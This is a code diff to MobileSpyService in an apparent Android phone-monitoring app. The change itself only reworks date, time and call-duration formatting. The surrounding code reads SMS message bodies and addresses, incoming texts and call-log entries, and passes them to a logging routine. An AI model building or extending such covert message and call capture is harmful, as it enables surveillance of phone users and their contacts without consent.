@@ -1,5 +1,7 @@
 package org.ddth.android.mobilespy;
 
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -18,7 +20,6 @@ import android.os.IBinder;
 import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 import android.telephony.gsm.SmsMessage;
-import android.text.format.DateUtils;
 
 public class MobileSpyService extends Service {
 
@@ -26,8 +27,8 @@ public class MobileSpyService extends Service {
     public static final int MESSAGE_TYPE_OUTBOX = 4;
 	public static final int MESSAGE_TYPE_SENT   = 2;
     
-	private static final int LOG_TIME_FORMAT = DateUtils.FORMAT_SHOW_TIME | DateUtils.FORMAT_24HOUR;
-	private static final int LOG_DATE_FORMAT = DateUtils.FORMAT_SHOW_DATE | DateUtils.FORMAT_SHOW_YEAR | DateUtils.FORMAT_ABBREV_MONTH;
+	private static final DateFormat LOG_TIME_FORMAT = new SimpleDateFormat("HH:mm:ss");
+	private static final DateFormat LOG_DATE_FORMAT = new SimpleDateFormat("yyyy-MM-dd");
 	
 	public static final String EXTRA_EVENT_TYPE = "mobilespy.event.type";
 	public static final int EVENT_TYPE_PHONE_ACTIVATED = 0;
@@ -120,11 +121,11 @@ public class MobileSpyService extends Service {
     		int bodyColumn = cursor.getColumnIndex("body");
     		int addressColumn = cursor.getColumnIndex("address");
 
-    		long now = cursor.getLong(dateColumn);
     		String from = "0";
     		String to = cursor.getString(addressColumn);
-            String date = DateUtils.formatDateTime(context, now, LOG_DATE_FORMAT);
-			String time = DateUtils.formatDateTime(context, now, LOG_TIME_FORMAT);
+    		Date now = new Date(cursor.getLong(dateColumn));
+    		String date = LOG_DATE_FORMAT.format(now);
+			String time = LOG_TIME_FORMAT.format(now);
 			String message = cursor.getString(bodyColumn);
 			MobileSpy.logSMS(date, time, from, to, message);
 		}
@@ -147,10 +148,13 @@ public class MobileSpyService extends Service {
 		}
 		
 		String number = cursor.getString(numberColumn);
-		long now = cursor.getLong(dateColumn);
-		String date = DateUtils.formatDateTime(context, now, LOG_DATE_FORMAT);
-		String time = DateUtils.formatDateTime(context, now, LOG_TIME_FORMAT);
-		String duration = cursor.getString(durationColumn);
+		Date now = new Date(cursor.getLong(dateColumn));
+		
+		String date = LOG_DATE_FORMAT.format(now);
+		String time = LOG_TIME_FORMAT.format(now);
+		long ellapse = cursor.getLong(durationColumn);
+		String duration = String.format("%02d:%02d:%02d", ellapse/3600, (ellapse % 3600)/60, (ellapse % 60));
+
 		int type = cursor.getInt(typeColumn);
 		
 		String from = number, to = phoneNumber;
@@ -180,9 +184,9 @@ public class MobileSpyService extends Service {
 			if (message != null && message.length() > 0) {
 				String from = msg[i].getOriginatingAddress();
 				String to = "0";
-				long now = new Date().getTime();
-				String date = DateUtils.formatDateTime(this, now, LOG_DATE_FORMAT);
-				String time = DateUtils.formatDateTime(this, now, LOG_TIME_FORMAT);
+				Date now = new Date();
+				String date = LOG_DATE_FORMAT.format(now);
+				String time = LOG_TIME_FORMAT.format(now);
 				MobileSpy.logSMS(date, time, from, to, message);
 			}
 		}	
